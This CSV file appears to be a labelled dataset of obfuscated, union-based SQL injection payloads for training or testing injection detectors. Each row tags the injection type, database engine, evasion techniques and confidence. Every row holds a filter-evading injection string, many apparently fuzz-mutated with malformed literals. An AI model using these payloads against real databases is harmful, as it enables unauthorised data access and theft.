payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"8B2B0B0O0x4o0x0x0b101O0b4B1100100'[$) ;UNIOn{All!sElecT/*|bLoH`vMXLE1dJ\_;78PE""bi M mY<y:@;GoO*/nUll,NUll,NUll,nUll,null,NULL,NULL--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0X0b110X0b0o0o0O0b901x1' || \ , ^(/*<~A*Hx}BY] {/JC[Iv: H*/;SelEct;'vIxV'[FrOm DUal/**/WhERE?(SelEct;0X7O0o7o5X4B0b0b6o0B101e81) ]= $0B1001B2x0B8B101x9e52|UnIon^alL;selecT NuLL,NULL,nULL,NuLl,nUll--",union_based,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"1'*~) WHERE 6056~lIkE (sElECt 6056) or:ROW< ( 0B0o2025,(SELecT:(selEcT (sELEct 7582))) ) > +( selEct Or FalsE oR FALse Or)4434=(SELECT 1495) anD (SELECT/**/1) oR ""IR""<>""ir"" ANd (sELECt 1) Or FalsE AND 457<>0X1Ca#cOUnT?;( * *) ,ConcAt (/**/ 0x7185706A0B1000111, &( >seleCT ( ElT ( 1045 LIKE 1045,(sElecT (SElECt 0x6X5)) ) ) ) ,4x717a767a0b1000111,Flo oR ( raND; ( 0x0 ) *(seLeCT 4) /*:G)-7;VSrtw""[;4] sJhZCr(P */) ;); X FRoM ( sEleCt 2498 UNIon!seLEcT 0X55d0;UNIOn SeLeCt|0xc13 unIOn SeLecT (sELecT (select (SELECT 1210))) "") A GrOuP by X ^) ! or (SeLect 3157) noT lIKe (SELECT 0X0O0xc55) Or 0x1583 nOt LIke 0x0X10af and#TRUE oR (selEct 0O10120)=(sELECt 4177) --jB/]?ri",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0b0b1100101'=>+)< / ) }/*(SeLEcT!(sELECt 0B101))%j?0o6L H+R Z){0b0O10(;Om)NQX OR ""/;""*LIKE ""/;="" OR False OR False#_vx;=T2A ByRt<O*/^()~(>UnioN ALl sELeCT?NUlL,NuLl,nuLl,NuLL--^",union_based,unknown,case_variation|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"0o0O2b2X0X7o8x0B0O0x0b0B0O0B1B0B101011111110001000'(<)& Or^`?< ](? SelEcT 'hFBT' wHerE.(sELECT^(SELEcT (SELeCt?(SelECT[(selEct 0x1O4c8x4a))))) < =&. (SELEct (SeleCT'(sElect?0O0x0O0O0X1c80))):UNion<ALL SeLECt+NuLl,Null,NuLL,NULl,nuLl,nUll,NulL,NuLl,nUlL,nuLl--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"8X0B0B0b110100011178010001010000011""! ])` );^/*;kUl*/ ) ?\UNiON@All SELEct}NUll,NULL,NULl,null,NULl,nULl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
0O0o0O1' ) ^) +- As WuWs wherE (SElEcT (sElEcT 0x1b05)) lIkE (SElECt (seLeCt (sELEct 6917)))/**/UNion aLl\SEleCt NuLl AND tRue anD trUe# zp,union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1"" ) )| < && row ( 0x1867,(SELeCT (seLEct (seLEct (SeLect (select (SEleCt 0o0x1d0x2D)))))) ) > ( SELeCt coUNT ( `* ) ,CONcAt ( 0x7171706A81,/*uJo(>PA\S{pmWD*/ ( /**/seLEcT ( ELt ( 0X185D liKe 0o0o0x165d,8X0b1 "") ) ] ) ,0x717a767a91,FLo;OR ( R aND (. 0X0b0 ) *0O2O2 /*X|X*/) ) x frOM ( sElecT:0x1448 unioN SElECT`(sEleCt (SELECt (sELecT (SeleCt (sELecT (sELect (SELECT (SELECT 1785)))))))) uNIon~SElecT (SeLEcT (sELECT (sELEct 0xF5b))) union selECt 0x1bf0o0O6 ) A GROUp By x ) aNd (& ( ""TBDl"" LIke ""TbDl",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"7O0x0X0x7X0B0B14%'\&)\{:uNiON ALl selECt+nULL,NULl,nuLl,NuLL &, :aND & (SELeCt<0o0o0B0x0x1x0B4o0o6)| ? anD + trUe/ANd TRUe ANd 0x1074 not lIke /*9jI~}=;bkj*/0x632A^And tRuE oR faLsE Or FAlSe OR`(SelEct 0) OR FAlsE aNd TRuE And TRUE OR FaLSe#}X:,ce&@-l3NXGNOuJFM$M_> j a",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0X6o7B1%'` ) )@ . ) unIon All:SeLECt NulL,NULL,null && (SELeCT (SELecT (SELECT 3X237D)))<>0X237E Or fAlsE#>(SeLECT.(seLeCt 0b0X5X3))<t:*",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1' $) _ ) ) or rOW <( (sELecT 0b10000410101),0b0B0x1dae672BF4cDe0B110fA9d3EF4f504941D54fA ) > ( ?SeLect counT ( * &) &,coNcAT *( 0o0x0o0b41011010110167001111710A71, ( ?SeleCt ( elt ( (sElECT 0o3321) ` LiKE!- (sELEcT 0X0O0X415),0x1 ) ) ) ,0X0X2CdA767a7O107,fLooR ( RanD ( 0X0 ): *(SElect (seLECt (sElEct$(SelECT (sELect (SeLect (seleCT (sELEcT (SELECT 0))))))))) : ) ) X FroM ( seLEcT (SElEct (SEleCT (sELEct (SElEcT (selECT 8418))))) UniOn SelECt 0X0O17d0 unIoN SelECt 0Xbeb uNION SElect;0x4ec ) A/GRoUP By X ) ANd ~ ( ( ? ( 'dRVk' lIkE 'drvk",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"9B0X0o2%"" ) ] Or rOW ( (SElECT (sELect (sElECt (selEcT (SELECT (SELECT (SELECT 1075))))))),(seLeCt 0x1D8A)? ) > ( selECT CouNT ( * ) ~,CoNCat ( 0x0o33260252A71, ( SElecT {( ELT (; 0O2023 LIKE[(SelECt 0X415),0X4 ) !)_: ) ,1X717a767A51,fLO $OR ( rand ( 2X0 ) *(sELEcT 0x0x1), ))^ ) x FROM ( seLEct 0x2128 UNion SeLect<0O0X31aA UNioN Select\0xBeb Union{select 0X4Ba )( a GROuP By,x ) aND_ (/*}ii`/*/ ""%"" lIke """,union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"7X1O7b3' oR _&(`~SElECt)'yaIi' fROM`dUAl!WHerE~0o0B0O0x5c0O0X0O110@=/0x0B101B3C11\union-All/*j!t{t?f0b1109wZ*/seLECT nUll,nuLL,NulL,nULl,NUll,NULl,Null,nULl,NUlL$aNd tRue ?and trUe Or$(seLecT 0X9X0) oR=(sELECT>(SelEcT (seleCt 0X0))) OR fAlsE anD{tRUE* OR (sElECT 8x0) Or falsE OR\fALSe OR ""G""=""Ga"" OR False#auYcv@&sP+';Bd;;",union_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
"0O9X0B4x6B0o0X5b8X0O3o0o4b0o1x3B6o0o0O0X0B8o7o8x1X5x3X4b110o0o3B0o0x0b10%""^uNION]aLL,SelEcT~NUll,nuLL,nULl--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"1"" ) /*;;5_W1iMVB9HY1[*/ ) ) anD RoW ( (sELECt (SELect 8O5xdB)),(sELeCt 0X1C5f) ) > ( SeLeCt cOUnT *( * && (SELECT 1) Or FALse and TRUe or fAlse#) ,CoNCAt ( 0o0x7171706a71, ( seLeCt ( elT? ( ""0{(""@likE ""4{("",0x1 ) ) ) ,0x718a267a71,FlOor ( Rand- ( (sELECt (Select (sELECT (SelEcT 0x0)))); ) *(SelecT 2) ) ) X FRoM ( sELeCT (SelECt (SEleCt 0X0B0O704)) UnioN SeleCt (SELeCT 0b194016001001) unION SELeCT 0O0xf5b Union SElEcT 0X1Bf6 ) a GRoUP;BY x ) anD !( ( ( ""SuXH"" LIKe ""sUXHANTg69o",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0o0B0b0b0B0b1100100111110011010011100010101000011000110100001010111011101010110101000110011000101101110001011010%' </**/) / [) > }); /**sp8*/UNiON/*[uEH*/aLl SelecT NULl,nULl,nuLl,NuLL,NuLl,Null,nULl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"6O0b0b115X0x6X0O4b0x0B110x7X0o0x0o0B0O1155%'/*E>RK0B111Eb*_$0B1O6X0B0x0B0O1!UaO&=} wY4o7 oK?'Pbi%^sZYnP1]NCIz2*/unIoN\All seLECT>Null,Null,nUlL,NUll--",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"4B0B1411101100: )/*g;;[Mb*/ as/**/raTG wHere 8XBD9 = (sELEcT 8XBd0b1001) UNION,alL}seleCt nUlL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0O3x0B0b1'/*""=/J[:) }OR falSE Or/**/'f'!='f'/**/or FALSE{oR (SeLecT^(SELEcT (SELect 0))) OR<FALsE oR (Select 0) oR 0x2123 Not likE 8483 and TrUE# UNION]ALL|SelECt null,NUll,NuLl,nulL,nUlL,NulL,Null,nUlL,nUlL,nULl? OR_? +0X0xD0B111001=0X0b0x0Xd0O105 and TrUe }And+ (Select~3X0o77e)=0X09E+oR FaLSE or$FalSE oR FAlSe aND#(""(sELECt (seleCT 4x0b10100100819))|lIke (sELEct (sElEct (SelEct (SeLECT=(seLeCT (SEleCt (SElEcT\(sElECt 0X523))))))))#jHG7O0X0B0o0B0B150 <CUx\u&^E3<z$sd?l)",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0b0b100B6o0o19533O0o1x0x0o4/*~Zv%Lbi5LsN(;D `:*/UniON aLl SeLECT}NuLL,nUlL,NulL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"3'@;)?%(UniOn.aLL+Select nULl,and%"" ""="" ""/**/`|| """"~(sElECt`7)+"")noT<lIkE;""~(seLEct^(SELECT 9))+"" AND (SELECT 1) OR False#0x0O6AW}+g",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_double_quote
"0O7b0x4""|]) '""UNIon$ALl@sEleCt@NUll,nulL,nulL,nUll,nUlL,nulL,nULL,Null,nUll ANd!'b~0x8d.'='b~0X0b0b101x0B1100000d.'&=OR '""O{b;""/*|]G ""&!Hdx3$hMMOy`nR5ez*/NOt`=<""o{b;"" && tRue&ANd)(SELECT 3939)<>(SELECT 3940) And 0O0o0b0b1010010000010000001100111101110111<>0b11010110000 AND 1#K~0o0x0o4b0B0XBRD6o!f\",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
0B1'|?) as{GoGU WHere 0B1005417512010}= (SELEct`0o18362) uNIOn@aLl\SeLeCt(nULl#yB5,union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0B9o0B0o5b0b0b0o0o8o5O0o0o0b0o0b0O0O0B0b0b1000010011001111101010100001001B0o0b211O0B101O4O0o6O3B0o3x0""&@)?""""unIoN`all)seLECt{NUlL,nULl,NuLL,nuLL,NULL,NULl,nUlL,NUlL,nuLl--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"7$\)@` aS;mNYY*wHERE=(seLeCT*(seleCT'0x4O0O0b0B0B0b1O0B0o43635)) =(0X0B1B111o0o10b0o0b10101001010010001101110001101101111001111 UnioN.alL'SelEct\NULl,null,nulL,NUlL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0b0B0o0B0xB%"")uNIOn*All/*u0O0O0O0B0o0B0b1010010000010011101010111000111111b2b0B1019uMgeA}r|XSCtGsNVdm=I?a;ZvYX}fV1K_*/SeLEct^nUlL,nulL,nUlL,Null,nULL,nUlL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0X1' ) AS Jysm[wHERe^(sELECt 0X32f9)>; LIKE /*J\f?*/0x6C0x1'UNion AlL sElECt nulL,nULL aNd ""*""<>""*!""$And (SEleCT (select (seleCt (selEct (SELecT 1)))))/*f@,*/ AND trUE or (SELECT 2902)<>(SelEct 2902)#guGi@>>j",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0b101O0o0b110b0O2X5X0O2""~wHere 9X0B0X9b2x3X9o0B0X0B0X0x3x9X0X0o0x0B0x0O53724;_=:?(seLeCT*6x9X0x0b111x4b4B8o5b0o0b1o4o2B7B0X0o0o0x9o3X0O0O4x0b0b1111101001B4)]unION~aLL,SElecT NuLL,NUll,NUll,nuLL,NuLl,nuLl,NULL,nuLl,NuLL--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"8O1O0B0B1101110X0B8O0o3O7o1B0o0B0B1010001o0B1X0b110X9\ !)! /,) )!'uNIon aLl SeLEcT$NUll,NulL,nULL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0o0o0o1'> OR;)[ (: SeLEcT^'XjCG' FRoM dUAL*WhERE 0X16B7:LIkE 0x16b7 UnIoN$All]sElECt,NUll,NUll,nULl^oR*'ph' noT lIKE.'Ph'{Or FAlse#hB ku7B101BuQ0jDO",union_based,oracle,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1X0o0b0B0b100001100110100110111B0O2X5b0B1111111001')or=\*(:{seLECT@'VqAg' from[DUal`whEre)(sElect.0o9b11X5x0O0b101x0O0o8fDA)=4O3o8X6X0x5X9O0X0b0O3O2o2x9X0O0o0o0B4x0b120O2B0x0FDa>UniOn All!SeLECT*NuLl,NulL,nUlL,NulL,NuLl,nUll,Null,NUlL,NUlL,NulL--",union_based,oracle,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"5' oR `( Select 'Ativ';fRoM Or fALSe AND TRUe or FAlSE Or fAlSe_AND tRUE Or 0o0#duaL:wHERe (seLECt (SElEct (SElect (Select (SELECT 4746)))))\\=`-(SelEct 7X2EA) UniOn AlL select/*T|O*/NULL,Null,nulL,nUll aND ""9b9r"" NOt lIKE/*jv*/""0b0o3rC""#^L[S",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_double_quote
"0O0x1-WhERE:(SeLEct$0X0b0B0o0b0x0B0O0O0b0X0b0o0X0O0b0B0b0b1011001101111101111000100010101111101011111000100111100011011110111100101001001011100111000111101ad)=2x0o0o221423;UnioN?aLL SELECT,nUlL,NUll,NulL,nULl,null,NulL,NULL,nuLl,NuLl,NulL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1@wHERE*4b0b1011111000000010001101100010010000111 ==( 7b0o0o0b0O0X046b[uNIon/*eA;0X0o4B10110Hc*/ALL sElEcT nuLl,NuLl,NUll,NuLl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0O3O2B0O0O0b31B1o5b111B0B10000011X0B0B7b4o0X0b3b3O0b0O4346B0O134' uniOn{ALl""sELECT|nUll,nulL,NuLl,NuLl,NulL--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0O1 ) *!WHERE 5x0X35ad/*c l;+JTnH*/} ;LIke (SeLECT (SELeCt (sElEct (seLECT 0xE3F)))) uNIOn alL sELEcT`nulL,nUlL,nULl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0X0o0X0X0B9x0B0X0B0B101o0B0b0B10O0O0O0B0O5x3O3x0O0b8B0x1{')> ,aS.pcND:wHere^7X0B2b0b100110110b0B0X9b0b0b0x0x0O13c5/*SXpB|KgOpZ$A>_OcMGZ:7KHs8G\B^MoJ)g0s j+a {oQC9iBE */<_lIKE~$/*E@<T (:0O0O0X0o9B100dpb;0O1hiH|0o0o0O2Z+(SeLeCT[(select@7X5)):.*/(Select;0B598x0X0O3X5B1010107001)&UniOn""all SElecT,NuLL,nuLL,NuLl,nulL,NulL,nULL,null,nULL,nUll,NuLl--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
0o4x7X7x0%' $ )] % ) uNiON ALl@seleCt:nULl && TRUE ANd[tRuE oR FAlSE or (SeleCt 0O0o0) oR FAlSe AND True#} bnh: (SELECT 2)@,union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"1' - ).(`,) //**/{aS KPdL`WhERE 0X23F1 = 0b0b0b10100011000111010101001001000011001010010000100001001101110101101100010110011101000111010111010100011101100001000001011000101100001001011 UnIon[alL seLECT NULL,nuLL,nUll,NuLl,nUlL,nUlL--",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"5' ;) ? && anD (SElECT 0x1cA5)=0O0x5C9B]aNd 2500 not?= 0301And'F' not !=/ 'fH' or (SeLECt 0) And TRuE aNd 1 or falsE ANd (SeLECT (SeleCt 8))^ANd TRUe#rOW ( 0x185D,(SELecT 0x0b1D2D) @) ^> ( selECt|coUNt (!?* ) ,CONcaT ( 0X7171702A74, ( SElEct /( eLt ( (SeLecT 6237) $= 0x185d,(sELEcT (sELecT (selECT 1))) ) # ) ) ,0X757a767a72,floOr ( RAnD ( (SElect 0) )' *(SeLeCt}(SeLEct 2)) /**/ )/* U5?*/ ) x FRoM= ( SeLecT (SeLECt 5102)}uNiON sELECT (selEcT (SelecT 3785))<unIOn sELecT 0xf5b unIOn SeLeCT|(seLeCT 0x1D22) ) a gROuP BY`x ) AnD <( 'jVLl' like 'JVlLj<tPL7!0YHu",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"2b101X0b7O8X0""_= ) ]?) ~ !aS,tjDZ&WhERE)0o0b0O0O0O0x0b8O8B1o5o0B4X0x366E* likE\-0X1De0B8O8B0B1011101012`unION}aLl seLecT.nUll,NuLl,NUll,NuLL,Null--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"0B0x0b7'{ $) )} unION aLl(sElEcT'NUll,nuLL,NuLL,nulL,nULL,NuLL,null,nULl,NUlL&<4o{K* ; AND ; |tRuE or fAlse AnD 0b0b1110100611105_NOt*LIkE (sELeCT (seLeCt 0x2X3Ab)) aND tRUE && (sEleCT 0x1X1) or}FalsE or (SElEct (SELECt (selECt (sELeCt (SELEct 0X4))))) Or 0x1A1 NOT~LIkE 0x1A1#?arTDk&x",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0b1' ) ) ? aS(POpm WHeRE 0X1aEe = 0X19c2^uniON alL<SELECt-NuLl,nuLL~Or 0X0B0X3A24 nOT& like -0B0b10000000001011001011111010100011010110100#R)J",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0o6'/*(SELECT~(SELECT (SELECT 5)))*/whERE]0x0X0XAB0 :liKE $0o0x0x10B0b0 uniON)aLl/*}-YJ ()!4T~:;Gbm*/seLECT$nULl,nULl,NuLL,NulL<And>(SeLecT^2334)!=9845""and?(SELeCt 380)<>0x17d#yon0BKVelTj",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"4x0x0O0X8b6o0X0X0X0O0X0x8X34'`}\)?+><)) & +)]_ UnIoN.alL=SELECT NuLl,nUll,NULL,NuLl,NuLL,NUll,NULl)OR`(SeleCT 0O0x0x4X0X0)]aNd (SeLECt_0o0B0o0x0b10150101010)}Not LIKe`0x1509 oR? FAlSE&ANd true oR(6X0 Or falSe#a;J((TxZ not^lIke <l2",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"6X0B0O0B1111101040.^&)- ) > UnioN All,SeleCt)NuLl,NulL,NulL,nULL,null,nUll,NUll,NUll,NULl,nuLl%OR (seLEct|(selecT/(SelECT (sELEcT]4x0O0O0b0x0x3b49)))).nOT lIKe 0B0901401901008{Or fAlse`and (Select`(SeLeCt (SELEcT[0b0B0x156C))) NOT LIKE 0O0X179d oR >FALse/*JEb3*/aNd 0o5b101 And 0x0O13D8.NoT/*M|d[w9tar*/like&(seleCT 0x11D9)$ and (SElEct 0x1) OR falsEaNDTRue aNd (SeLeCt 0x4b9)~nOT LIKE (sELecT 0x132b)]or FalsE aND truE oR/**/(selEct (SELECT 0)) ANd (seLEct 1) OR 0 OR False#(_!o<h_N>7sJALw",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,numeric
"0X0X0B0o9b7B1191101801%' ) -unIOn ALl SeLECt/*S:*/nUll,nuLL,NulL,NuLL,NUll,NULl,nUlL,NUlL aND 0B8x7B0x0B7\anD (selECT 0B1)$> anD ] '""T;4A""=""t;7a"" OR|FAlSE]or_FAlse oR FaLSE@oR faLsE Or FALSE and 0o19297 noT liKE (seleCt 0x2628) Or, FALSe or faLSE oR FaLsE or false Or fALsE or (sElecT (SELECT 6575))=6576#zcP^LAtq",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"1%"" ) ) ) oR RoW ( &(seLECt (SELECT 1045)),0X1d8A ) > ( sELECT COUNT ( * ) ,cOncAt ( 9x0x6d6e7aa71, ( *seLECT ( ELT ( (sElEcT (SELECT 1045)) LiKE <(select (seLEcT 0x415)),(SeLECt 0B1) ) ) {) ,0x014a667A71,flo || ( r AnD~ ( 0X0B0 )/**/ *(select 2) {) ) x FroM @ ( sELecT (SelECT (sELect 0x634)) unION SELect 0x35d0(uNIOn SeLeCt (SElECt (SeLEcT 7xBeB)) uNION selECT 0X4BA ) a(GRouP bY,x ) ANd/ ( ( ( ""%"" LIke """,union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"8x0B0o0x1%"" )/*n|J~ 7b/{fKVRI &&:""+oJvo""=""+ojVO""<Or(False or FALSe#M}&a*/?~UniON AlL SelECt_NUlL*And[0o7X8b901x5~aND*0x0O0O1 and (SelEct (sElECt (sELect 0x1))) and 0x5\Or fALsE#0X4/adQ?z",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0"" ) AS BpMK wHeRe:0B3b0x1A8=0o7x0o078C+unIon aLL selECT NulL,NULl,NuLL,NULl/And tRUE:aND+""G""<>""g%"" AND:TruE anD@TRUE or 0X0 &&]<TruE Or/**/FalsE OR "" T:""="" t:^"" anD<(SElecT (selECT (SELECT (SELECT 1))))#uJ? xpelW4",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_double_quote
"1 `)) /**/ )/**/ )AS MGVw wheRE 0x103b = 0b0b1111101110110110100101101000110910100011:uNIOn All SElEcT&nUlL,nUlL,null,Null--",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0B2x9'/*5Z <?*/In;BOOLEAn}mOde/*ksb*/ )? !unIoN@ALl/**/ Or falSe*oR fAlsE#SElEcT/*k.;ze#W/ k~k*/NULL,nUlL,nuLl,NULl,nUlL,nuLL,NULl# AND {< ;:(SELeCt""0x0B0B11001001)#kd0b0O0x0O3 1Ow0B1001;\ZeFzz?",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"0b9"". oR rOw (+ 0X415,0b0o20116755453562 ) > ( }Select cOUNT ( _* ) ,ConcAT ( 0X0o93267172A71, ( SelECt* >( eLt ( (seLECT 0O0x415)=(SelECt (sElect (SElECt?(SeLEct (selECT (SElECt 0x0x179D)))))),7x0B1 ) ) + ) ,7X912A0b0B1141111111a41,fLO OR ( raND ( (seleCt (SelECT (sELEct (SELECT (SELECT 0))))). ) *0X0B0x0o2 )@ ) X FrOM ( seLEcT 0X20b0 UnION(SelECT (SElect (SeleCT (sELect (SeleCt 0x1440)))) unIon SELEcT{8O5709 UNiON SElECt 0x4Ba ) A GRoup by X ) ? And ""cgPM"" lIKE ""cGpm",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1', ?) _), /* EA ~NYV */ as UmAH wHerE 0o0X5B0B7XE0B1C^^LIke; (SeLECT 0x1243)%UNION all'SELECT nulL,nuLl,NULL,Null)&& (sELEcT (sELecT[0b0X1))'And ""X;"" nOT = ""X;("" AND( TRUE or False Or FALsE or FalsE#<Gla~D3l",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,string_double_quote
"0B7B0b1100110001x0x1B0o0B1XA+;) ``uNiOn AlL*SelECt Null,nuLL,NULL,nuLl--",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"0O0X0b1o0X0x0O2%' ])/*!/N (SelEcT 0B110)4G)|1;*/ UNION)aLl sElEcT!nULL,NULl,nuLL,Null,nuLl aNd/*G Not like )\S+.gfo!W*/true_ && !(SelecT{(SElEcT=(sEleCt]0X4eca))) lIkE'(selEcT 1x0b0o1a92)>AND ""Sk""=""Sk"" OR ; 0x23De=(sElEcT (selECT 9283)) +?OR.. (SELECT.(SELecT 0X1143))=(SeLect 0B0X1145)&&TRuE OR ""k""[LIKE ""kO"" ANd True#io0O4gA&'FR?CP9q{S;A",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"1' OR (_ SElECT+'ZVPl' whErE (sELeCT/0x0X0B1010f0b0b1001011001){LIke:And@'"" '='"" ' ANd/**/TRUe#0b0X0o556""uNIoN aLl@SeLeCt nUll,nUlL.Or.0B0o0O0B1110010101001;)LIKe]>0B0O5B1210010501110}or|FaLSE#/Q::ho`,`x<D _",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"0o0O0O7b8o8b0b0B139X0b0o0B0x9X5%"" +} && >0b0X6362 <>>9x6363*Or]FAlsE +OR \0O10XaAF!like 0b0O0o0b11101101110100& aND` ""FL""<>""fll""/**/ OR (SEleCT-0X0B0B0B0X121B)<>0B1O11013 Or faLse OR FaLsE#) ' `)<_-[`)]> UNiON$alL&SeleCt?nULL,nULL,Null,Null,NUlL,Null,nulL,nuLl.;aNd )True#IXz)3o0B0X2MGKpK,",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"2x9X1B198""_}() <$=AND )(select}(sElEcT (SELECT 0b0o5))) OR False AND True#)/*IuhDJE*/ ; uNiON\aLL`seLect!nUll,null,NULl,nUll,NuLL,nUll^+or` False aNd'""R;"" LIKe {""R;""$ANd TRUE or]fALsE#0o0O0B0x64Etm4qpnqoM",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"6X1'+ ( SelEcT 'ejoX'/*-*/wHErE/*[/-:p*/(seLecT (SElECt/**/(SElect 0O0b1010001110101))) liKe 0B0b1011110000100101010100111001111100111!uniON-alL-sELeCt nulL,NulL,NUlL/**/Or 0X1708<>0X1708#Dc",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
